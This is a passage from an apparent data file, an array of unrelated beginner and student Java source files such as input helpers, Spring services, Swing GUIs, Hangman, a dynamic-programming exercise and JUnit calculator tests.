itemView.findViewById(R.id.ImageView);\n            TextName = itemView.findViewById(R.id.TextName);\n            TextDescription = itemView.findViewById(R.id.TextDescription);\n            TextPrice = itemView.findViewById(R.id.TextPrice);\n        }\n    }\n}\n",
    "import java.util.Scanner;\n\npublic class SafeInput {\n    public static String getNonZeroLenString(Scanner pipe, String prompt) {\n        String retString = \"\";\n        do {\n            System.out.print(\"\\n\" + prompt + \": \");\n            retString = pipe.nextLine();\n        } while (retString.length() == 0);\n\n        return retString;\n    }\n\n    public static int getInt(Scanner pipe, String prompt) {\n        int value;\n        do {\n            System.out.print(\"\\n\" + prompt + \": \");\n            while (!pipe.hasNextInt()) {\n                String input = pipe.next();\n                System.out.println(\"Invalid input. Please enter an integer.\");\n            }\n            value = pipe.nextInt();\n            pipe.nextLine(); // Clear the newline character\n        } while (value < Integer.MIN_VALUE || value > Integer.MAX_VALUE);\n\n        return value;\n    }\n\n    public static double getDouble(Scanner pipe, String prompt) {\n        double value;\n        do {\n            System.out.print(\"\\n\" + prompt + \": \");\n            while (!pipe.hasNextDouble()) {\n                String input = pipe.next();\n                System.out.println(\"Invalid input. Please enter a double value.\");\n            }\n            value = pipe.nextDouble();\n            pipe.nextLine(); // Clear the newline character\n        } while (value < -Double.MAX_VALUE || value > Double.MAX_VALUE);\n\n        return value;\n    }\n\n    public static int getRangedInt(Scanner pipe, String prompt, int low, int high) {\n        int value;\n        do {\n            System.out.print(\"\\n\" + prompt + \" [\" + low + \" - \" + high + \"]: \");\n            while (!pipe.hasNextInt()) {\n                String input = pipe.next();\n                System.out.println(\"Invalid input. Please enter an integer.\");\n            }\n            value = pipe.nextInt();\n            pipe.nextLine(); // Clear the newline character\n        } while (value < low || value > high);\n\n        return value;\n    }\n\n    public static double getRangedDouble(Scanner pipe, String prompt, double low, double high) {\n        double value;\n        do {\n            System.out.print(\"\\n\" + prompt + \" [\" + low + \" - \" + high + \"]: \");\n            while (!pipe.hasNextDouble()) {\n                String input = pipe.next();\n                System.out.println(\"Invalid input. Please enter a double value.\");\n            }\n            value = pipe.nextDouble();\n            pipe.nextLine(); // Clear the newline character\n        } while (value < low || value > high);\n\n        return value;\n    }\n\n    public static boolean getYNConfirm(Scanner pipe, String prompt) {\n        String input;\n        boolean isValidInput;\n        do {\n            System.out.print(\"\\n\" + prompt + \" [Y/N]: \");\n            input = pipe.next();\n            isValidInput = input.matches(\"[YyNn]\");\n            if (!isValidInput) {\n                System.out.println(\"Invalid input. Please enter 'Y' or 'N'.\");\n            }\n        } while (!isValidInput);\n\n        return input.equalsIgnoreCase(\"Y\");\n    }\n\n    public static String getRegExString(Scanner pipe, String prompt, String regEx) {\n        String value;\n        do {\n            System.out.print(\"\\n\" + prompt + \": \");\n            value = pipe.nextLine();\n        } while (!value.matches(regEx));\n\n        return value;\n    }\n\n    public static void prettyHeader(String msg) {\n        int width = 60;\n        int stars = (width - msg.length() - 6) / 2; // 3 stars on each side\n        StringBuilder header = new StringBuilder(width);\n        for (int i = 0; i < width; i++) {\n            header.append(\"*\");\n        }\n        System.out.println(header);\n        System.out.println(\"***\" + \" \".repeat(stars) + msg + \" \".repeat(stars) + \"***\");\n        System.out.println(header);\n    }\n}\n",
    "package org.example;\n\nimport java.util.Scanner;\n\npublic class Contador {\n    public static class ParametrosInvalidosException extends Exception{\n\n    }\n\n    public static void main(String[] args) {\n        Scanner terminal = new Scanner(System.in);\n        System.out.println(\"Digite o primeiro par\u00e2metro\");\n        int parametroUm = terminal.nextInt();\n        System.out.println(\"Digite o segundo par\u00e2metro\");\n        int parametroDois = terminal.nextInt();\n\n        try {\n            //chamando o m\u00e9todo contendo a l\u00f3gica de contagem\n            contar(parametroUm, parametroDois);\n\n        } catch (Exception exception) {\n            //imprimir a mensagem: O segundo par\u00e2metro deve ser maior que o primeiro\n            System.out.println(\"O segundo par\u00e2metro deve ser maior que o primeiro\");\n        }\n\n    }\n\n    static void contar(int parametroUm, int parametroDois) throws ParametrosInvalidosException {\n        if (parametroUm > parametroDois){\n            throw new ParametrosInvalidosException();\n        }\n\n        int contagem = parametroDois - parametroUm;\n        for (int i= 1; i <= contagem; i++){\n            System.out.println(\"Imprimindo o n\u00famero \" + i);\n\n        }\n    }\n}",
    "package com.mejia.inventory.inventory.services;\n\nimport com.mejia.inventory.inventory.dao.ICategoryDao;\nimport com.mejia.inventory.inventory.models.Category;\nimport com.mejia.inventory.inventory.response.CategoryResponseRest;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\n\n@Service\npublic class CategoryServicesIpm implements ICategoryServices {\n\n    //Se inyecta la dependencia del Repositirio\n    @Autowired\n    private ICategoryDao categoryDao;\n\n    @Override\n    @Transactional(readOnly = true)\n    public ResponseEntity<CategoryResponseRest> search() {\n        CategoryResponseRest responseRest = new CategoryResponseRest();\n\n\n        try {\n            List<Category> categoryList= (List<Category>) categoryDao.findAll();\n            responseRest.getCategoryResponse().setCategories(categoryList);\n            responseRest.setMetadata(\"OK\",\"200\",\"Consulta exitosa\");\n\n        }catch (Exception e){\n            responseRest.setMetadata(\"Respuesta no OK\",\"404\",\"Error al consultar\");\n            e.getStackTrace();\n\n            return new ResponseEntity<CategoryResponseRest>(responseRest, HttpStatus.NOT_FOUND);\n\n        }\n        return new ResponseEntity<CategoryResponseRest>(responseRest, HttpStatus.OK);\n    }\n\n    /**\n     *\n     * @param id\n     * @return responseRest\n     */\n\n    @Override\n    @Transactional(readOnly = true)\n    public ResponseEntity<CategoryResponseRest> searchById(Long id) {\n        CategoryResponseRest responseRest = new CategoryResponseRest();\n        List<Category> categoryList =new ArrayList<>();\n        try {\n\n            Optional<Category> category=categoryDao.findById(id);\n            if (category.isPresent()) {\n                categoryList.add(category.get());\n                responseRest.getCategoryResponse().setCategories(categoryList);\n                responseRest.setMetadata(\"OK\", \"200\", \"Consulta exitosa\");\n            }else {\n                responseRest.setMetadata(\"Respuesta no OK\",\"404\",\"Error al consultar por id\");\n                return new ResponseEntity<CategoryResponseRest>(responseRest, HttpStatus.NOT_FOUND);\n\n\n            }\n\n        }catch (Exception e){\n            responseRest.setMetadata(\"Respuesta no OK\",\"404\",\"Error al consultar por id\");\n            e.getStackTrace();\n\n            return new ResponseEntity<CategoryResponseRest>(responseRest, HttpStatus.BAD_REQUEST);\n\n        }\n        return new ResponseEntity<CategoryResponseRest>(responseRest, HttpStatus.OK);\n    }\n\n    /**\n     *\n     * @param category\n     * @return esponseRest\n     */\n    @Override\n    @Transactional\n    public ResponseEntity<CategoryResponseRest> saveCategory(Category category) {\n        CategoryResponseRest responseRest = new CategoryResponseRest();\n        List<Category> categoryList =new ArrayList<>();\n        try {\n            Category category1=categoryDao.save(category);\n\n\n            if (category !=null) {\n                categoryList.add(category1);\n                responseRest.getCategoryResponse().setCategories(categoryList);\n                responseRest.setMetadata(\"OK\", \"204\", \"Registro Exitosos\");\n            }else {\n                responseRest.setMetadata(\"Respuesta no OK\",\"404\",\"Error alagregar registeros\");\n                return new ResponseEntity<CategoryResponseRest>(responseRest, HttpStatus.BAD_REQUEST);\n\n\n            }\n\n        }catch (Exception e){\n            responseRest.setMetadata(\"Respuesta no OK\",\"404\",\"Error al consultar por id\");\n            e.getStackTrace();\n\n            return new ResponseEntity<CategoryResponseRest>(responseRest, HttpStatus.BAD_REQUEST);\n\n        }\n        return new ResponseEntity<CategoryResponseRest>(responseRest, HttpStatus.OK);\n    }\n\n    @Override\n    @Transactional\n    public ResponseEntity<CategoryResponseRest> updateCategory(Category category, Long id) {\n\n\n        CategoryResponseRest responseRest = new CategoryResponseRest();\n        List<Category> categoryList =new ArrayList<>();\n        try {\n\n            Optional<Category> searchCategory=categoryDao.findById(id);\n            if (searchCategory.isPresent()){\n\n                //Se inicia actualizaci\u00f3n de categoria\n                searchCategory.get().setName(category.getName());\n                searchCategory.get().setDescription(category.getDescription());\n\n                Category categoryToUpdate=categoryDao.save(searchCategory.get());\n\n                if (categoryToUpdate!=null){\n                    categoryList.add(categoryToUpdate);\n                    responseRest.getCategoryResponse().setCategories(categoryList);\n                    responseRest.setMetadata(\"Respuesta ok\",\"200\",\"Categoria actualizada\");\n                }else {\n                    responseRest.setMetadata(\"Categori",
    "package QCM_Projet;\r\n\r\nimport java.awt.BasicStroke;\r\nimport java.awt.BorderLayout;\r\nimport java.awt.Color;\r\nimport java.awt.Component;\r\nimport java.awt.Dimension;\r\nimport java.awt.FlowLayout;\r\nimport java.awt.Font;\r\nimport java.awt.GradientPaint;\r\nimport java.awt.Graphics;\r\nimport java.awt.Graphics2D;\r\nimport java.awt.GridBagConstraints;\r\nimport java.awt.GridLayout;\r\nimport java.awt.Image;\r\nimport java.awt.RenderingHints;\r\nimport java.awt.TextField;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.util.ArrayList;\r\nimport java.util.Arrays;\r\nimport java.util.Map;\r\n\r\nimport javax.swing.BorderFactory;\r\nimport javax.swing.Box;\r\nimport javax.swing.BoxLayout;\r\nimport javax.swing.ButtonGroup;\r\nimport javax.swing.ImageIcon;\r\nimport javax.swing.JButton;\r\nimport javax.swing.JFrame;\r\nimport javax.swing.JLabel;\r\nimport javax.swing.JPanel;\r\nimport javax.swing.JPasswordField;\r\nimport javax.swing.JRadioButton;\r\nimport javax.swing.JScrollPane;\r\nimport javax.swing.JTextArea;\r\nimport javax.swing.JTextField;\r\nimport javax.swing.JViewport;\r\nimport javax.swing.SwingConstants;\r\nimport javax.swing.Timer;\r\nimport javax.swing.border.TitledBorder;\r\n\r\npublic class Interface_QCM extends JFrame {\r\n   QCM qcm=new QCM() ; \r\n   Question[] question_qcm=new Question[20];\r\n   Timer t;\r\n   String nom_etud;\r\n   String nv_etud;\r\n   String fil_etud;\r\n   Timer application_commence ;\r\n   int maxHeight=350 ; \r\n   int fontSize=30;\r\n   long TempsPrec = System.currentTimeMillis();\r\n   int k=50 ;\r\n   double V= 0.6; \r\n   double v=V*100;\r\n   boolean sizeP=false ;\r\n   boolean vides =true ; \r\n   int y_tQST=70;\r\n   int x_tQST=750 ;\r\n   int x_tQSM=0 ; \r\n   int Note=0 ; \r\n   int largeur =1200;\r\n   int longeur=800 ; \r\n   int temps_qcm=-1 ; \r\n   int temps_qst=21 ; \r\n   int TEMPS=10; \r\n   int NUM_QST=20;\r\n   int vitesse=1000 ;\r\n   int num_qst =0 ; \r\n   int H=50;\r\n   int Notation=0 ; \r\n   String reponses[]=new String[NUM_QST] ;\r\n   String PASSWORD= \"ab1\" ;\r\n   JPanel esp_etud;\r\n   JPanel esp_prof ;\r\n   JPanel mainPanel; \r\n   JPanel infos ; \r\n   JPanel etudiant ; \r\n   JPanel prof ; \r\n   JPanel questions ; \r\n   JPanel options ; \r\n   JPanel bas ; \r\n   JPanel fin_QCM ; \r\n   JPanel commence ; \r\n   JScrollPane listeEtud ; \r\n   JLabel nom_ =new JLabel();\r\n   JLabel Niveau =new JLabel();\r\n   JLabel filiere=new JLabel();\r\n   JLabel titre=new JLabel(\"OCA OCP Java SE 8 Programmer Practice Tests\");\r\n   JLabel t_qcm=new JLabel(\"Temps de QCM : 0s\"); \r\n   JLabel t_qst=new JLabel(\"Temps de Question : 20s\");\r\n   JLabel N_qst=new JLabel(\"Question : 1\");\r\n   JTextArea qst = new JTextArea(\"QCM commence dans quelque secondes\");\r\n   JLabel n=new JLabel();\r\n   JLabel decision=new JLabel(\"Decision : RATTRAPAGE (\"+v+\"%)\");\r\n\t JRadioButton opt[]=new JRadioButton[] {new JRadioButton(\"A\"),new JRadioButton(\"B\"),new JRadioButton(\"C\"),new JRadioButton(\"D\")\t};\r\n\t ImageIcon commenceIm=new ImageIcon(\"Images/pg1QCM.png\");\r\n\t \r\n\t \r\n\t ImageIcon smile = new ImageIcon(\"Images/not smiling score.png\"); // chemin relatif ou absolu vers l'image\r\n\t ImageIcon etudiantIcone=new ImageIcon(\"Images/etudiant icon.png\");\r\n\t ImageIcon profIcone=new ImageIcon(\"Images/prof icon.png\");\r\n\t JLabel etudiantLabel=new JLabel(etudiantIcone);\r\n\t JLabel profLabel=new JLabel(profIcone);\r\n\t JLabel profLabel2=new JLabel(profIcone);\r\n\t JLabel smileLabel = new JLabel(smile);\r\n\t JLabel commenceLabel ; \r\n\t JButton listEtud ; \r\n\t JButton skip=new JButton(\"Ignorer \u25b6\");\r\n\t JButton Accueil =new JButton(\"Revenir \u00e0 l'Accueil\");\r\n\t JButton commencerTous=new JButton(\"Commencer\") ; \r\n\t JButton QuitterTous=new JButton(\"Quitter\") ; \r\n\t \r\n   //----------------------------------\r\n   public Interface_QCM(){\r\n   this.setTitle(\"ILYAS -QCM\");\r\n\tthis.setDefaultCloseOperation(EXIT_ON_CLOSE);\r\n\tthis.setSize(largeur, longeur);\r\n\tthis.setLocationRelativeTo(null);\r\n\tthis.setVisible(true);\r\n\tsetBackground(Color.BLACK);\r\n\t//-----------------------------\r\n\t for(int i=0;i<NUM_QST;i++) {\r\n\t\t   reponses[i]=\"\";\r\n\t   }\r\n\t//-----------------------------\r\n    mainPanel = new JPanel() {\r\n    \t @Override\r\n    \t    protected void paintComponent(Graphics g) {\r\n    \t        super.paintComponent(g);\r\n    \t        Graphics2D g2d = (Graphics2D) g;\r\n    \t        GradientPaint gradient = new GradientPaint(20, 0,new Color(20, 13, 17) , 0, getHeight(),new Color(62, 91, 102) );\r\n    \t        g2d.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);\r\n    \t        g2d.setPaint(gradient);\r\n    \t        g2d.fillRect(0, 0, getWidth(), getHeight());\r\n    \t    }\r\n    };\r\n    mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));\r\n    \r\n    \r\n    commence =new JPanel();\r\n    commence.setLayout(null); \r\n    JLabel commenceL=new JLabel(commenceIm);\r\n    commenceL.setBounds(0, 0, getWidth(), getHeight());\r\n    //--\r\n    commenceLabel = new JLabel(\"Bienvenue Chers Professeurs et Etudiants\");\r\n    commenceLabel.setFont(new Font(\"Arial\", Font.ITALIC, 25));\r\n    commenceLabel.setBounds(220, 200, 600, 30);\r\n    //",
    "import java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nclass Restaurant {\n    private String name;\n    private double rating;\n\n    public Restaurant(String name, double rating) {\n        this.name = name;\n        this.rating = rating;\n    }\n\n    public double getRating() {\n        return rating;\n    }\n}\n\nclass RatingAnalyzer {\n    private List<Restaurant> restaurants;\n\n    public RatingAnalyzer(List<Restaurant> restaurants) {\n        this.restaurants = restaurants;\n    }\n\n    public void analyzeRatings() {\n        int[][] ratingRanges = {{1, 5}, {6, 10}};\n\n        Map<String, Integer> ratingCounts = new HashMap<>();\n        Map<String, Double> ratingTotals = new HashMap<>();\n        for (int[] range : ratingRanges) {\n            ratingCounts.put(range[0] + \"-\" + range[1], 0);\n            ratingTotals.put(range[0] + \"-\" + range[1], 0.0);\n        }\n\n        for (Restaurant restaurant : restaurants) {\n            double rating = restaurant.getRating();\n            for (int[] range : ratingRanges) {\n                if (rating >= range[0] && rating <= range[1]) {\n                    String key = range[0] + \"-\" + range[1];\n                    ratingCounts.put(key, ratingCounts.get(key) + 1);\n                    ratingTotals.put(key, ratingTotals.get(key) + rating);\n                    break;\n                }\n            }\n        }\n\n        for (String key : ratingCounts.keySet()) {\n            int count = ratingCounts.get(key);\n            double totalRating = ratingTotals.get(key);\n            double averageRating = count == 0 ? 0 : totalRating / count;\n            System.out.println(\"Number of restaurants rated \" + key + \": \" + count);\n            System.out.println(\"Average rating for restaurants rated \" + key + \": \" + averageRating);\n        }\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        List<Restaurant> restaurants = new ArrayList<>();\n        restaurants.add(new Restaurant(\"The Heritage Grill.\", 3.2));\n        restaurants.add(new Restaurant(\"Classic Cuisine Cafe.\", 5.9));\n        restaurants.add(new Restaurant(\"Timeless Tastes Tavern.\", 6.7));\n        restaurants.add(new Restaurant(\"Vintage Elegance Bistro.\", 8.1));\n        restaurants.add(new Restaurant(\"The Traditions Table.\", 4.4));\n\n        RatingAnalyzer analyzer = new RatingAnalyzer(restaurants);\n        analyzer.analyzeRatings();\n    }\n}\n",
    "package Assignment;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Hangman {\r\n    private static String[] words = {\"java\", \"python\", \"programming\", \"computer\", \"algorithm\", \"software\"};\r\n    private static String word;\r\n    private static char[] progress;\r\n    private static int attemptsLeft;\r\n\r\n    public static void main(String[] args) {\r\n        Scanner scanner = new Scanner(System.in);\r\n        chooseWord();\r\n        initializeProgress();\r\n        attemptsLeft = 6;\r\n\r\n        while (attemptsLeft > 0 && !isWordGuessed()) {\r\n            System.out.println(\"Attempts left: \" + attemptsLeft);\r\n            displayProgress();\r\n            System.out.print(\"Enter a letter: \");\r\n            char guess = scanner.next().charAt(0);\r\n            checkGuess(guess);\r\n        }\r\n\r\n        if (isWordGuessed()) {\r\n            System.out.println(\"Congratulations! You guessed the word: \" + word);\r\n        } else {\r\n            System.out.println(\"Sorry, you ran out of attempts. The word was: \" + word);\r\n        }\r\n    }\r\n\r\n    private static void chooseWord() {\r\n        word = words[(int) (Math.random() * words.length)];\r\n    }\r\n\r\n    private static void initializeProgress() {\r\n        progress = new char[word.length()];\r\n        for (int i = 0; i < word.length(); i++) {\r\n            progress[i] = '_';\r\n        }\r\n    }\r\n\r\n    private static void displayProgress() {\r\n        for (char letter : progress) {\r\n            System.out.print(letter + \" \");\r\n        }\r\n        System.out.println();\r\n    }\r\n\r\n    private static boolean isWordGuessed() {\r\n        for (char letter : progress) {\r\n            if (letter == '_') {\r\n                return false;\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n\r\n    private static void checkGuess(char guess) {\r\n        boolean found = false;\r\n        for (int i = 0; i < word.length(); i++) {\r\n            if (word.charAt(i) == guess) {\r\n                progress[i] = guess;\r\n                found = true;\r\n            }\r\n        }\r\n        if (!found) {\r\n            attemptsLeft--;\r\n            System.out.println(\"Incorrect guess.\");\r\n        }\r\n    }\r\n}",
    "package April_01_Assignment;\r\n\r\nimport java.util.Scanner;\r\n\r\npublic class Q2_Minimum_Path_Sum_Triangle {\r\n    public static void main(String[] args) {\r\n        Scanner scanner = new Scanner(System.in);\r\n//        System.out.print(\"Enter the number of test cases: \");\r\n//        int t = scanner.nextInt();\r\n//        while (t!= 0) {\r\n            System.out.print(\"Enter the number of rows in the triangle: \");\r\n            int n = scanner.nextInt();\r\n            int[][] triangle = new int[n][n];\r\n            System.out.println(\"Enter the elements of the triangle:\");\r\n            for (int i = 0; i < n; i++) {\r\n                for (int j = 0; j <= i; j++) {\r\n                    triangle[i][j] = scanner.nextInt();\r\n                }\r\n            }\r\n            int result = minimumPathSum(triangle);\r\n            System.out.println(\"Minimum path sum: \" + result);\r\n        //}\r\n        scanner.close();\r\n    }\r\n\r\n    public static int minimumPathSum(int[][] triangle) {\r\n        int n = triangle.length;\r\n        // Start from second last row and move upwards\r\n        for (int i = n - 2; i >= 0; i--) {\r\n            // For each element in the current row, update it with the minimum sum of the adjacent elements\r\n            for (int j = 0; j <= i; j++) {\r\n                triangle[i][j] += Math.min(triangle[i + 1][j], triangle[i + 1][j + 1]);\r\n            }\r\n        }\r\n        // The minimum path sum will be the value at the top of the triangle\r\n        return triangle[0][0];\r\n    }\r\n}\r\n",
    "package com.Practice.Practice.Component;\n\nimport com.Practice.Practice.Dto.CompanyDto;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.servlet.HandlerInterceptor;\nimport org.springframework.web.servlet.ModelAndView;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\n@Component\npublic class PostMethodInterceptor implements HandlerInterceptor {\n    private final ObjectMapper objectMapper;\n\n    public PostMethodInterceptor(ObjectMapper objectMapper) {\n        this.objectMapper = objectMapper;\n    }\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        if (\"POST\".equalsIgnoreCase(request.getMethod())) {\n            // Convert request payload to object\n            CompanyDto companyDto = objectMapper.readValue(request.getInputStream(), CompanyDto.class);\n            // Inspect the webSiteURL field and set to null if URL is not valid\n            if (!isValidUrl(companyDto.getWebSiteURL())) {\n                companyDto.setWebSiteURL(null);\n                // Convert back to JSON and set as request payload\n                String jsonPayload = objectMapper.writeValueAsString(companyDto);\n                request.setAttribute(\"jsonPayload\", jsonPayload);\n            }\n        }\n        return true; // continue processing the request\n    }\n\n    @Override\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n        // Do nothing after handling the request\n    }\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        // Do nothing after completing the request\n    }\n\n    private boolean isValidUrl(String url) {\n        // Implement your URL validation logic here\n        // For demonstration purposes, this example considers any non-empty string as a valid URL\n        return url != null && !url.isEmpty();\n    }\n}\n",
    "import java.util.*;\r\n\r\npublic class array_two_d {\r\n    public static void main(String[] args) {\r\n        Scanner sc = new Scanner(System.in);\r\n        System.out.println(\"enter the number of rows\");\r\n        int n = sc.nextInt();\r\n\r\n        System.out.println(\"enter the number of columns\");\r\n        int m = sc.nextInt();\r\n\r\n        int arr[][] = new int[n][m];\r\n        takearr(arr, n, m);\r\n        printarr(arr, n, m);\r\n\r\n    }\r\n\r\n    public static void takearr(int arr[][], int n, int m) {\r\n        Scanner sc = new Scanner(System.in);\r\n        for (int i = 0; i < n; i++) {\r\n            for (int j = 0; j < m; j++) {\r\n                arr[i][j] = sc.nextInt();\r\n            }\r\n        }\r\n    }\r\n\r\n    public static void printarr(int arr[][], int n, int m) {\r\n        for (int i = 0; i < m; i++) {\r\n            if (i % 2 == 0) {\r\n                for (int j = 0; j < n; j++) {\r\n                    System.out.print(arr[j][i] + \" \");\r\n                }\r\n            } else {\r\n                for (int j = n - 1; j >= 0; j--) {\r\n                    System.out.print(arr[j][i] + \" \");\r\n                }\r\n            }\r\n            System.out.println();\r\n        }\r\n    }\r\n\r\n}\r\n",
    "package com.example.mongoBlog;\n\nimport com.example.mongoBlog.model.Posts;\nimport com.example.mongoBlog.repository.PostRepositoryImp;\nimport com.example.mongoBlog.repository.PostsRepository;\nimport com.example.mongoBlog.repository.SimpleMongoRepository;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.EnableAutoConfiguration;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.data.mongodb.config.EnableMongoAuditing;\nimport org.springframework.data.mongodb.repository.config.EnableMongoRepositories;\n\n@SpringBootApplication\n@EnableMongoRepositories\npublic class MongoBlogApplication implements CommandLineRunner {\n\n\t@Autowired\n\tPostsRepository postsRepository;\n\n\t@Autowired\n\tSimpleMongoRepository simpleMongoRepository;\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(MongoBlogApplication.class, args);\n\t}\n\n\t@Override\n\tpublic void run(String... args) throws Exception {\n\t\tsimpleMongoRepository.deleteAll();\n\n\t\tSystem.out.println(\"-------------CREATE A POST-------------------------------\\n\");\n\t\tcreateGroceryItems();\n\n\t}\n\n\t//CREATE\n\tvoid createGroceryItems() {\n\t\tSystem.out.println(\"Data creation started...\");\n//\t\tsimpleMongoRepository.save(new Posts(\"1\", \"title 1\",\"content1\"));\n//\t\tsimpleMongoRepository.save(new Posts(\"2\", \"title 2\", \"content2\"));\n\n\t\tpostsRepository.createPost(new Posts(\"1\", \"title 1\",\"content1\"));\n\t\tpostsRepository.createPost(new Posts(\"2\", \"title 2\", \"content2\"));\n\n\t\tSystem.out.println(\"Data creation complete...\");\n\t}\n}\n",
    "package edu.miu.cs.cs489apsd.lab1a.productmgmtapp.model;\n\nimport java.time.LocalDate;\n\npublic class Product {\n    private Long productId;\n    private String name;\n    private LocalDate dateSupplied;\n    private Integer quantityInStock;\n    private Double unitPrice;\n\n    // All args constructor\n    public Product(Long productId, String name, LocalDate dateSupplied, Integer quantityInStock, Double unitPrice) {\n        this.productId = productId;\n        this.name = name;\n        this.dateSupplied = dateSupplied;\n        this.quantityInStock = quantityInStock;\n        this.unitPrice = unitPrice;\n\n    }\n\n    // No args constructor\n    public Product() {\n        this(null, null, null, null, null);\n    }\n\n    public Product(String name) {\n        this(null, name, null, null, null);\n\n    }\n\n    public Long getProductId() {\n        return productId;\n    }\n\n    public void setProductId(Long productId) {\n        this.productId = productId;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public LocalDate getDateSupplied() {\n        return dateSupplied;\n    }\n\n    public void setDateSupplied(LocalDate dateSupplied) {\n        this.dateSupplied = dateSupplied;\n    }\n\n    public Integer getQuantityInStock() {\n        return quantityInStock;\n    }\n\n    public void setQuantityInStock(Integer quantityInStock) {\n        this.quantityInStock = quantityInStock;\n    }\n\n    public Double getUnitPrice() {\n        return unitPrice;\n    }\n\n    public void setUnitPrice(Double unitPrice) {\n        this.unitPrice = unitPrice;\n    }\n\n    @Override\n    public String toString() {\n        return STR.\"\\{productId} \\{name} \\{dateSupplied} \\{quantityInStock} \\{unitPrice}\";\n        // return \"Product [productId=\" + productId + \", name=\" + name + \",\n        // dateSupplied=\" + dateSupplied\n        // + \", quantityInStock=\" + quantityInStock + \", unitPrice=\" + unitPrice + \"]\";\n    }\n\n}\n",
    "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.*;\nimport java.nio.file.*;\nimport java.util.stream.*;\n\npublic class DataStreams extends JFrame {\n    private JTextArea originalTextArea, filteredTextArea;\n    private JTextField searchField;\n    private JButton loadButton, searchButton, quitButton;\n    private Path filePath;\n\n    public DataStreams() {\n        setTitle(\"Data Streams GUI\");\n        setSize(800, 600);\n        setDefaultCloseOperation(EXIT_ON_CLOSE);\n        setLayout(new BorderLayout());\n\n        originalTextArea = new JTextArea();\n        originalTextArea.setEditable(false);\n        JScrollPane originalScrollPane = new JScrollPane(originalTextArea);\n\n        filteredTextArea = new JTextArea();\n        filteredTextArea.setEditable(false);\n        JScrollPane filteredScrollPane = new JScrollPane(filteredTextArea);\n\n        JPanel topPanel = new JPanel();\n        searchField = new JTextField(20);\n        loadButton = new JButton(\"Load File\");\n        searchButton = new JButton(\"Search\");\n        quitButton = new JButton(\"Quit\");\n        topPanel.add(new JLabel(\"Search String:\"));\n        topPanel.add(searchField);\n        topPanel.add(loadButton);\n        topPanel.add(searchButton);\n        topPanel.add(quitButton);\n\n        loadButton.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n                JFileChooser fileChooser = new JFileChooser();\n                int result = fileChooser.showOpenDialog(DataStreams.this);\n                if (result == JFileChooser.APPROVE_OPTION) {\n                    filePath = fileChooser.getSelectedFile().toPath();\n                    try {\n                        String fileContent = new String(Files.readAllBytes(filePath));\n                        originalTextArea.setText(fileContent);\n                        filteredTextArea.setText(\"\");\n                        searchField.setEnabled(true);\n                        searchButton.setEnabled(true);\n                    } catch (Exception ex) {\n                        ex.printStackTrace();\n                        JOptionPane.showMessageDialog(DataStreams.this, \"Error loading file: \" + ex.getMessage(), \"Error\", JOptionPane.ERROR_MESSAGE);\n                    }\n                }\n            }\n        });\n\n        searchButton.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n                String searchTerm = searchField.getText();\n                try {\n                    Stream<String> lines = Files.lines(filePath);\n                    String filteredContent = lines\n                            .filter(line -> line.contains(searchTerm))\n                            .collect(Collectors.joining(\"\\n\"));\n                    lines.close();\n                    filteredTextArea.setText(filteredContent);\n                } catch (Exception ex) {\n                    ex.printStackTrace();\n                    JOptionPane.showMessageDialog(DataStreams.this, \"Error searching file: \" + ex.getMessage(), \"Error\", JOptionPane.ERROR_MESSAGE);\n                }\n            }\n        });\n\n        quitButton.addActionListener(new ActionListener() {\n            public void actionPerformed(ActionEvent e) {\n                dispose();\n            }\n        });\n\n        add(topPanel, BorderLayout.NORTH);\n        add(originalScrollPane, BorderLayout.WEST);\n        add(filteredScrollPane, BorderLayout.EAST);\n\n        searchField.setEnabled(false);\n        searchButton.setEnabled(false);\n    }\n\n    public static void main(String[] args) {\n        SwingUtilities.invokeLater(() -> {\n            DataStreams gui = new DataStreams();\n            gui.setVisible(true);\n        });\n    }\n}\n",
    "package fi.utu.smirnovkostiantyn;\n\nimport org.junit.jupiter.api.Test;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass CalculatorTest {\n\n    @Test\n    void getResult() {\n        Calculator calculator = new Calculator();\n        assertEquals(0, calculator.getResult());\n    }\n\n    @Test\n    public void testReset() {\n        Calculator calculator = new Calculator();\n        calculator.add(3);\n        assertEquals(3, calculator.getResult());\n        calculator.reset();\n        assertEquals(0, calculator.getResult());\n    }\n\n    @Test\n    public void testAdd() {\n        Calculator calculator = new Calculator();\n        calculator.add(5);\n        assertEquals(5, calculator.getResult());\n    }\n\n    @Test\n    public void testSubtract() {\n        Calculator calculator = new Calculator();\n        calculator.subtract(3);\n        assertEquals(-3, calculator.getResult());\n    }\n\n    @Test\n    public void testMultiply() {\n        Calculator calculator = new Calculator();\n        calculator.add(3);\n        calculator.multiply(4);\n        assertEquals(12, calculator.getResult());\n    }\n\n    @Test\n    public void testExponent() {\n        Calculator calculator = new Calculator();\n        calculator.add(2);\n        